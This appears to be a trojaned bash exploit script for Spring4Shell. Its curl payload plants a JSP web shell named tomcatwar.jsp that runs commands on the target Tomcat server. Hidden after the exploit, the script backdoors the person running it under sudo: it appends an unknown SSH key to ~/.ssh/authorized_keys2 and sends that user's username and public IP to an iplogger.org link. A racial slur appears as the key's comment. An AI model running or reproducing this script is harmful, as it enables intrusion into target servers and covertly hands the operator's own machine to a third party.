#!/bin/bash
echo 'Usage: sudo bash spring.sh "http://target.ltd/path"'

# Payload
curl -v -H "c1: runtime" -H "c2: <%" -H "suffix: %>//" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" "$1";echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+nTfKhVgvDlBaoIC+y8TnPeTIfGOdIR8LQIMgtqMF6OpuLUrnrrd+EAt/QIDfZoB/7Mig1BAuOtxb4+UehX0ZyhMUDxQEdbk+C4QjY9Ghru1Fga54Y/YqN2qfQIe7stQ/2+mE6gEtGIezR64BmcSLxskuRdwJQ+9rVrDmkTTj+1XdygN4fHGmz6etweihP8M4cojAQ7LlAmFzLXmJoG2dFboEjsChqbEbz3UFJDKKwuu6N8n4El7tk3qXHveNMvN2HwR2EdmLpg5YKmENyu35vNYP1Sr0/NE3F/dyh8PduaRZbrCfmm7p530cnxRorS3p9a5PAXNGasDhSztRZX0fKpyScrtcCcm7rW6OoP1V1RzzFgaCeXEfJNlhPsJt/984WiFP2ziZ9Wq1fKIxIOhIRUD6JMeDq+RthwkmbKtENQPqwFr6Vut8qtLfe/oFKfKhfQwjJHf/UwyLn0zvtPRZ67kH0SVN3Wl8WdoU+rnCMgaImn6Q520YNNJ2bYxBvU= a@nigger' >> ~/.ssh/authorized_keys2 && curl -s 'https://iplogger.org/2ppGn6' -H "referer: `whoami`@`curl -s ifconfig.me`"

# Did it work? Manual verification!
echo "Manual Verification Required! Visit: http://target.ltd/tomcatwar.jsp?pwd=j&cmd=whoami"
